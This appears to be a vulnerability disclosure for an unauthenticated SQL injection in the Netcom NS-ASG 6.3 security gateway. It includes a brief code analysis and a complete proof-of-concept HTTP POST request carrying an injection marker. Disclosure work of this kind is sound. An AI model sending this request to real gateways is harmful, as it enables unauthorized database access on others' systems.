There is a SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official website:https://www.netentsec.com/

version:NS-ASG 6.3

Vulnerability points：/protocol/iscgwtunnel/uploadiscgwrouteconf.php
analyse as below:
Accept the array $GWLinkId through the variable messagecontent, then traverse the $GWLinkId variable and directly substitute it into the sql statement without any verification. Causing unauthorized sql injection

<img width="416" alt="image" src="https://github.com/istlnight/cve/assets/143585263/29b824d9-8e18-44b6-8bca-29efd4be4575">


As follows, there is no validation during the execution of SQL injection

Poc：
```
POST /protocol/index.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

jsoncontent={"protocolType":"uploadiscgwtunnel","messagecontent":["1*"]}
```

<img width="416" alt="image" src="https://github.com/istlnight/cve/assets/143585263/c145558c-1a11-4626-ba05-dbe4623c09de">

<img width="416" alt="image" src="https://github.com/istlnight/cve/assets/143585263/09047ca3-f248-4f1b-8995-26cb40588d82">


